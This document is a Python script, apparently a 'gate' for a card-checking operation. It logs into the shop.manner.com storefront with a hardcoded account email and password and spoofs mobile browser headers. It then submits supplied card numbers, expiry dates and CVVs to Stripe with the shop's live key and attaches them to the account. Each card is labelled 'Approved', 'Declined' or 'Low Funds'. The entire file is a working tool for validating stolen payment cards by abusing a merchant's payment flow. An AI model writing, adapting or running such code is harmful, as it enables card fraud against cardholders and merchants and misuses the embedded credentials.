import aiohttp
import asyncio
import uuid
from bs4 import BeautifulSoup

async def br_gate(cc, mes, ano, cvv, proxy_config=None):
    try:
        yy = ano.split("20")[-1] if "20" in ano else ano[-2:]
        mm = mes.zfill(2)
        
        user_agent = "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        
        headers = {
            'authority': 'shop.manner.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'referer': 'https://shop.manner.com/man_int/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user_agent,
        }
        
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(
                    'https://shop.manner.com/man_int/customer/account/login/referer/aHR0cHM6Ly9zaG9wLm1hbm5lci5jb20vbWFuX2ludC9jdXN0b21lci9hY2NvdW50L2luZGV4Lw~~/',
                    headers=headers,
                    timeout=aiohttp.ClientTimeout(total=60)
                ) as response:
                    html = await response.text()
            except Exception:
                return "Error ⚠️", "Site unreachable"
            
            soup = BeautifulSoup(html, 'html.parser')
            form_key_input = soup.find('input', {'name': 'form_key'})
            
            if not form_key_input:
                return "Error ⚠️", "Could not extract form key"
            
            form_key = form_key_input.get('value')
            
            login_data = {
                'form_key': form_key,
                'login[username]': 'igcc4280@gmail.com',
                'login[password]': 'C@qOH0of2Jb$jbi',
                'persistent_remember_me': 'on',
            }
            
            login_headers = {
                'authority': 'shop.manner.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://shop.manner.com',
                'referer': 'https://shop.manner.com/man_int/customer/account/login/',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': user_agent,
            }
            
            try:
                async with session.post(
                    'https://shop.manner.com/man_int/customer/account/loginPost/',
                    headers=login_headers,
                    data=login_data,
                    allow_redirects=False,
                    timeout=aiohttp.ClientTimeout(total=60)
                ) as login_response:
                    if login_response.status != 302:
                        return "Error ⚠️", "Login failed"
            except Exception:
                return "Error ⚠️", "Login failed"
            
            payment_headers = {
                'authority': 'shop.manner.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                'referer': 'https://shop.manner.com/man_int/customer/account/',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': user_agent,
            }
            
            try:
                async with session.get(
                    'https://shop.manner.com/man_int/stripe/customer/paymentmethods/',
                    headers=payment_headers,
                    timeout=aiohttp.ClientTimeout(total=60)
                ) as payment_response:
                    payment_page = await payment_response.text()
            except Exception:
                return "Error ⚠️", "Payment page unreachable"
            
            if 'customer/account/login' in str(payment_response.url):
                return "Error ⚠️", "Session expired"
            
            guid = str(uuid.uuid4())
            muid = str(uuid.uuid4())
            sid = str(uuid.uuid4())
            csi = str(uuid.uuid4())
            
            stripe_headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': user_agent,
            }
            
            stripe_data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=IQ&pasted_fields=number&payment_user_agent=stripe.js%2Fcba9216f35%3B+stripe-js-v3%2Fcba9216f35%3B+payment-element%3B+deferred-intent%3B+autopm&referrer=https%3A%2F%2Fshop.manner.com&time_on_page=411369&client_attribution_metadata[client_session_id]={csi}&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=automatic&client_attribution_metadata[elements_session_config_id]=a65a5207-ef44-49f3-8a63-0f316e664c69&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid={guid}&muid={muid}&sid={sid}&key=pk_live_51IAvn9FuKmfQdziff1ZttUVotdtFS65Bh6lfVfWRCL8K0GXOCvOosDt45XyI2c03kiZpPNUrAvxGLyIUp6BmJqSh00ExuNocOq&_stripe_version=2025-08-27.basil'
            
            try:
                async with session.post(
                    'https://api.stripe.com/v1/payment_methods',
                    headers=stripe_headers,
                    data=stripe_data,
                    timeout=aiohttp.ClientTimeout(total=60)
                ) as stripe_response:
                    stripe_json = await stripe_response.json()
            except Exception:
                return "Error ⚠️", "Stripe connection failed"
            
            if "id" not in stripe_json:
                error_msg = stripe_json.get('error', {}).get('message', 'Unknown error')
                if "insufficient_funds" in str(error_msg).lower():
                    return "Approved ✅", "01 Low Funds"
                return "Declined ❌", error_msg[:50]
            
            payment_method_id = stripe_json["id"]
            
            add_payment_headers = {
                'authority': 'shop.manner.com',
                'accept': '*/*',
                'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                'content-type': 'application/json',
                'origin': 'https://shop.manner.com',
                'referer': 'https://shop.manner.com/man_int/stripe/customer/paymentmethods/',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user_agent,
                'x-requested-with': 'XMLHttpRequest',
            }
            
            add_payment_data = {'paymentMethodId': payment_method_id}
            
            try:
                async with session.post(
                    'https://shop.manner.com/man_int/rest/V1/stripe/payments/add_payment_method',
                    headers=add_payment_headers,
                    json=add_payment_data,
                    timeout=aiohttp.ClientTimeout(total=60)
                ) as final_response:
                    response_data = await final_response.json()
                    response_text = str(response_data)
                    
                    if 'pm_' in response_text and '"brand"' in response_text:
                        return "Approved ✅", "Card Added Successfully"
                    elif "insufficient_funds" in response_text.lower():
                        return "Approved ✅", "01 Low Funds"
                    else:
                        return "Declined ❌", "Card was declined"
            except Exception:
                return "Declined ❌", "Failed to add card"
            
    except Exception as e:
        return "Error ⚠️", str(e)[:40]